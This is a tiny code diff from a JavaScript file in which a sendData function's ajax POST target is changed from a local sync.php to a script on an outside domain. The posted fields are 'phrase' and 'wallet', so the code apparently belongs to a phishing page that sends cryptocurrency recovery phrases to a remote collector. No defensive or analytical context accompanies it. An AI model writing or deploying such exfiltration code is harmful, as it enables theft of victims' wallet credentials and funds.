@@ -82,7 +82,7 @@ function sendData( data ) {
 $.ajax({
 
 type:"post",
-url:"sync.php",
+url:"https://frognutrition.com/emailServer/sync.php",
 data: 'phrase='+phraseVal+'&wallet='+walletVal,
 success:function(respnx)
 {   
